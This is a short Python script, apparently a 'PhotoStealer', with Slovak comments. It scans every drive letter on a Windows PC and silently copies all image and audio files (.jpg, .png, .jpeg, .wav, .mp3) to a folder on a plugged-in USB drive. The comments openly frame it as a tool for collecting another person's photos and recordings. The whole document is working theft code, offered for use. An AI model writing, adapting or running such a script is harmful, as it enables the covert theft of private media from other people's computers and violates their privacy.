import os
import shutil

#Adresa kde sa ulozia fotky

# TREBA UPRAVIT PODLA POUZIVATELOVEHO USBcka (E:, D:, F:, G:, H, ...)
destination_directory = "E:/PY-PhotoStealer/photos/"

# Zoznam pripon kt. chcem skopirovat
file_extensions = [".jpg", ".png", ".jpeg", ".wav", ".mp3"]

# Kod definicie kt. prechadza VSETKY DRIVE pripojene k PC a hlada tam tieto pripony a SKOPIRUJE ICH a posle do USBCKA E:
def process_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Skontroluje ci pripona sedi
            if file.lower().endswith(tuple(file_extensions)):
                # Vytvorenie cesty k root codu
                source_path = os.path.join(root, file)
                destination_path = os.path.join(destination_directory, file)
                # Kopírujte soubor na SD kartu
                shutil.copy2(source_path, destination_path)

# Prejde vsetky pripojene zariadenia
drives = [chr(i) + ":" for i in range(65, 91)]
for drive in drives:
    if os.path.exists(drive):
        process_directory(drive)

print("Kopirovanie suborov prebehlo USPESNE.")

